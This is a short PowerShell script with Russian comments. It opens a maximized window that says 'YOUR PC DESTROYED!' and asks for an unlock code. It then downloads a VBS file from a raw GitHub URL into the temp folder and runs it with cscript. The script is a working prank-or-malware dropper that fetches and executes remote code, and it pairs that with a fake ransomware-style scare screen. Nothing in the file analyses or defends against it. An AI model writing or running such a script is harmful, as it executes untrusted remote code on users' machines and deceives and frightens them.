# Максимизируем новое окно PowerShell с этим кодом
$script = @'
Clear-Host
Write-Host "YOUR PC DESTROYED!" -ForegroundColor Red
Read-Host "Введите код для разблокировки"

# Путь для скачивания VBS
$tempVbs = "$env:TEMP\temp.vbs"

# Ссылка на VBS (raw ссылка с GitHub!)
$vbsUrl = "https://raw.githubusercontent.com/Roario0602/nyan/main/temp.vbs"

# Скачиваем temp.vbs
Invoke-WebRequest -Uri $vbsUrl -OutFile $tempVbs

# Запускаем temp.vbs через cscript
Start-Process -FilePath "cscript.exe" -ArgumentList $tempVbs
'@

Start-Process powershell -ArgumentList "-NoExit", "-Command", $script -WindowStyle Maximized
